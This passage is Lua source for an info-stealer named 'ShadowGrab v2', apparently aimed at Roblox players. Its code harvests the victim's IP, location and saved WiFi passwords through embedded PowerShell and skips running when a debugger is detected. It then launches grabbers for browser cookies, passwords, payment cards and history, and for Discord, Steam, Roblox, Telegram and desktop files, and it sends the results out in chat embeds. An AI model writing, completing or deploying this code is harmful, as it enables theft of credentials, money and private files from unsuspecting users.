            "IP" = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
            "City" = (Invoke-WebRequest -Uri "https://ipinfo.io/json" -UseBasicParsing).Content | ConvertFrom-Json | Select-Object -ExpandProperty city
            "Country" = (Invoke-WebRequest -Uri "https://ipinfo.io/json" -UseBasicParsing).Content | ConvertFrom-Json | Select-Object -ExpandProperty country
        }
        $info | Out-String
    ]]
    local result = RunPS(ps)
    if result and result ~= "" then
        SendRaw(result, "🖥️ System Info")
    end
end

-- ═══════════════════════════════════════════
-- WIFI PASSWORDS
-- ═══════════════════════════════════════════
local function GrabWifi()
    local ps = [[
        $results = @()
        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
        foreach ($p in $profiles) {
            $pass = (netsh wlan show profile name="$p" key=clear) | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
            $results += "$p | $pass"
        }
        $results | Out-String
    ]]
    local result = RunPS(ps)
    if result and result ~= "" then
        SendRaw(result, "📶 WiFi Passwords")
    end
end

-- ═══════════════════════════════════════════
-- MAIN
-- ═══════════════════════════════════════════
local function Execute()
    -- Pre-flight
    if CheckDebug() then
        warn("ShadowGrab: Debug detected, skipping")
        return
    end
    
    SendEmbed("🚀 ShadowGrab v2 — Started", 0x9b59b6, {
        {name = "Target", value = LocalPlayer and LocalPlayer.Name or "Unknown", inline = true},
        {name = "PlaceId", value = tostring(game.PlaceId), inline = true},
        {name = "JobId", value = game.JobId or "N/A", inline = true},
    })
    
    -- System
    if SG.Options.SelfDelete then
        task.spawn(GrabSystemInfo)
        task.wait(0.5)
    end
    
    -- Browsers
    if SG.Options.Browsers then
        for _, b in ipairs(SG.Browsers) do
            task.spawn(GrabBrowserData, b)
        end
        task.wait(2)
        task.spawn(ExtractSpecificCookies)
        task.spawn(ExtractPasswords)
        task.spawn(ExtractCards)
        task.spawn(ExtractHistory)
    end
    
    task.wait(3)
    
    -- Discord
    if SG.Options.Discord then
        task.spawn(GrabDiscord)
    end
    
    -- Steam
    if SG.Options.Steam then
        task.spawn(GrabSteam)
    end
    
    -- Roblox
    if SG.Options.Roblox then
        task.spawn(GrabRoblox)
    end
    
    -- Telegram
    if SG.Options.Telegram then
        task.spawn(GrabTelegram)
    end
    
    -- Files
    if SG.Options.FileGrabber then
        task.spawn(GrabRecentFiles)
        task.spawn(GrabDesktopFiles)
    end
    
    task.wait(3)
    
    -- WiFi
    task.spawn(GrabWifi)
    
    task.wait(2)
    
    SendEmbed("✅ ShadowGrab v2 — Done", 0x2ecc71, {
        {name = "Status", value = "All extraction tasks complete", inline = false},
    })
end

task.spawn(Execute)
